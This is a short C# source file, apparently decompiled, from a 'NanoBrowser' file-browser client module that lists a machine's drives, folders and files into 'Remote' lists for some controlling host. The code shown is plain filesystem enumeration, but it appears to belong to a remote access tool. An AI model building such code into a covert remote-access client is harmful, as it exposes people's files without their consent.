using System;
using System.Collections.Generic;
using System.IO;

namespace FileBrowserClient
{
    internal sealed class Functions
	{
		public static List<string> RemoteFiles = new List<string>();
		public static List<string> RemoteFolders = new List<string>();
		public static List<string> RemoteDrives = new List<string>();

		public static string EnumerateRemoteFiles(string path)
		{
			string result;
			try
			{
				string fullName = new DirectoryInfo(path).FullName;
				bool flag = path.Contains("\\");
				if (!flag)
				{
					path += "\\";
				}
				RemoteFiles = new List<string>();
				RemoteFolders = new List<string>();
				string[] directories = Directory.GetDirectories(path);
				foreach (string path2 in directories)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(path2);
					RemoteFolders.Add(directoryInfo.Name);
				}
				string[] files = Directory.GetFiles(path);
				foreach (string fileName in files)
				{
					FileInfo fileInfo = new FileInfo(fileName);
					string item = string.Concat(new string[]
					{
						"1::",
						fileInfo.Name,
						"::",
						fileInfo.Extension,
						"::",
						fileInfo.Length.ToString()
					});
					RemoteFiles.Add(item);
				}
				result = fullName;
			}
			catch (Exception ex)
			{
				result = EnumerateRemoteFiles(path.Remove(path.LastIndexOf(Path.DirectorySeparatorChar)));
			}
			return result;
		}

		public static void EnumerateRemoteDrives()
		{
			RemoteDrives = new List<string>();
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				bool isReady = driveInfo.IsReady;
				if (isReady)
				{
					string item = driveInfo.RootDirectory.Name.Split(new char[]
					{
						Path.DirectorySeparatorChar
					})[0] + Convert.ToString(Path.DirectorySeparatorChar) + "::" + Convert.ToString((driveInfo.DriveType == DriveType.Fixed) ? 2 : 3);
					RemoteDrives.Add(item);
				}
			}
		}

		public static void LogMessage(string message)
		{
			ClientMain.LoggingHost.LogClientMessage(string.Format("[NanoBrowser]: {0}", message));
		}
	}
}